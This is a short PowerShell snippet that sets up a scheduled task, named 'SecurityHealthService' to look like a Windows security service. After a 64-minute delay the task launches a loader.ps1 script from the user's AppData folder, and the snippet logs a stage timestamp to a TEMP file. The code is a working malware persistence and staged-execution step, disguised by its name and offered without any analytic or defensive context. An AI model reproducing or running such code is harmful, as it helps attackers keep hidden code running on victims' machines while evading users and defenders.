$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\loader.ps1`""
$TaskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(64)
Register-ScheduledTask -TaskName 'SecurityHealthService' -Action $TaskAction -Trigger $TaskTrigger -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
